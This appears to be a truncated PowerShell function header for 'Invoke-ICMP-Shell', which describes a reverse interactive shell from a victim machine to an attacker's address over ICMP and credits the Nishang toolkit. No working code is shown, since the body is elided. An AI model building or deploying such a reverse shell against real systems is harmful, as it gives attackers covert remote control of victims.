function Invoke-ICMP-Shell
{ 
<#
.SYNOPSIS
Reverse interactive PowerShell from the victim to IPAddress over ICMP. 
...
Derived from: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1
...
#>           
    ...
    # Shell banner appearance and output redirection based on Powerfun - Written by Ben Turner & Dave Hardy
